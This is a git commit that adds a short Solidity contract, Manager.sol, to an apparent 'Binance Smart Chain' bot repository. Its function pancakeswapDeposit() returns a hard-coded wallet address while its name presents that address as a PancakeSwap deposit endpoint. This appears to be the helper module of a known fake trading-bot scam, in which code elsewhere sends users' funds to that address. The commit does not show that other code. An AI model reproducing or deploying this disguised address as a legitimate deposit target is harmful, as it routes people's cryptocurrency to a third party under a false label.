3857c5611609cc288709ce3f847209e3832129c8
racailleur101 <91016836+racailleur101@users.noreply.github.com>
2022-01-29 15:59:33 +0100

    Add files via upload

---
+++ binancesmartchainv2-main/Manager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public pure {
+	}
+
+	function pancakeswapDeposit() public pure returns (address) {
+		return 0xe1745A0b61a3A8DBFcc6C36b77465543BA6Ee8C4;
+	}
+	
+}
